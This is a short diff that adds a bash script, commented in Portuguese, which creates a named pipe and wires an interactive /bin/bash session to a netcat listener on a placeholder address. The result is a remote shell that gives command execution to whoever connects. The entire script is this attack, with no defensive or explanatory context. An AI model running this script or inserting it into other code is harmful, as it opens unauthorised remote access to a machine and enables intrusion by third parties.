@@ -1,0 +1,7 @@
+#!/bin/bash
+
+#cria arquivo pipe
+mkfifo /tmp/conect
+
+# redireciona o shell de forma interativa para a conexao do nc
+cat /tmp/conect | /bin/bash -i 2>&1 | nc -vl <ipserver>  > /tmp/conect
